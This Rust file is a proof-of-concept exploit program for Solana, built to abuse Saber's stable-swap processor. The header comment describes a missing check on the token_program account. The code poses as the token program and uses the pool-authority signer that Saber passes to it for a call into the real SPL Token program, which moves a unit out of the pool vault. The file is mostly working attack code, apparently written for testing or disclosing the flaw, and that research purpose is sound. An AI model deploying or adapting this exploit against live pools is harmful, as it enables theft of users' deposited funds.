//! PoC attacker program ("fake token program").
//!
//! Saber's stable-swap processor never validates that the `token_program` account
//! passed to swap/deposit/withdraw is the real SPL Token program. It builds SPL
//! Token instructions with `token_program.key` as the *program id* and
//! `invoke_signed`s them with the pool-authority PDA as signer.
//!
//! If an attacker passes this program as `token_program`, this program is invoked
//! by Saber with (for the swap path) the pool vault + the attacker destination +
//! the swap-authority PDA (marked signer). The natural exploit is to CPI into the
//! real Tokenkeg program and move vault funds using the PDA signer.
//!
//! This program attempts exactly that and logs the outcome.

use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    msg!("MAL: invoked with {} accounts", accounts.len());
    for (i, ai) in accounts.iter().enumerate() {
        msg!(
            "MAL: acct[{}] key={} signer={} writable={}",
            i,
            ai.key,
            ai.is_signer,
            ai.is_writable
        );
    }

    // Saber passes [source, destination, authority] metas to the "token program".
    // Try to use them against the REAL Tokenkeg program (transfer 1 unit out of
    // the source, signed by the authority it handed us).
    if accounts.len() >= 3 {
        let tokenkeg =
            Pubkey::from_str_const("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
        let mut data = vec![3u8]; // SPL Token Transfer (legacy 3-account layout)
        data.extend_from_slice(&1u64.to_le_bytes());
        let ix = Instruction {
            program_id: tokenkeg,
            accounts: vec![
                AccountMeta::new(*accounts[0].key, false),
                AccountMeta::new(*accounts[1].key, false),
                AccountMeta::new_readonly(*accounts[2].key, true),
            ],
            data,
        };
        let infos = [accounts[0].clone(), accounts[1].clone(), accounts[2].clone()];
        match invoke(&ix, &infos) {
            Ok(()) => msg!("MAL: TOKENKEG CPI SUCCEEDED"),
            Err(e) => msg!("MAL: tokenkeg cpi blocked: {:?}", e),
        }
    }

    Ok(())
}
